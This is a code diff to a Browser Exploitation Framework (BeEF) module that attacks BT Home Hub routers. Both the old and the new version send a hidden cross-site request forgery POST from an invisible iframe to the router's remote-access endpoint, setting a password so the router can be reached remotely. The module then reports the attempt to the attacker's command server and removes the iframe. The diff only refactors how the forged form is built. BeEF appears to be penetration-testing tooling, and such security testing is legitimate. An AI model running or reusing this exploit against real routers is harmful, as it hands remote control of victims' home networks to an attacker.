@@ -17,39 +17,16 @@ beef.execute(function() {
   var gateway = '<%= @base %>'; 
   var passwd = '<%= @password %>';
 
-  var bt_home_hub_iframe = beef.dom.createInvisibleIframe();
 
-  var form = document.createElement('form');
-  form.setAttribute('action', gateway + "/cgi/b/ras//?ce=1&be=1&l0=5&l1=5");
-  form.setAttribute('method', 'post');
 
-  var input = null;
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', '0');
-  input.setAttribute('value', '31');
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', '1');
-  input.setAttribute('value', '');
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', '30');
-  input.setAttribute('value', passwd);
-  form.appendChild(input);
-
-  bt_home_hub_iframe.contentWindow.document.body.appendChild(form);
-  form.submit();
+  var bt_home_hub_iframe = beef.dom.createIframeXsrfForm(gateway + "/cgi/b/ras//?ce=1&be=1&l0=5&l1=5", "POST",
+      [{'type':'hidden', 'name':'0', 'value':'31'} ,
+       {'type':'hidden', 'name':'1', 'value':''},
+       {'type':'hidden', 'name':'30', 'value':passwd}]);
 
   beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
 
   cleanup = function() {
-    delete form;
     document.body.removeChild(bt_home_hub_iframe);
   }
   setTimeout("cleanup()", 15000);
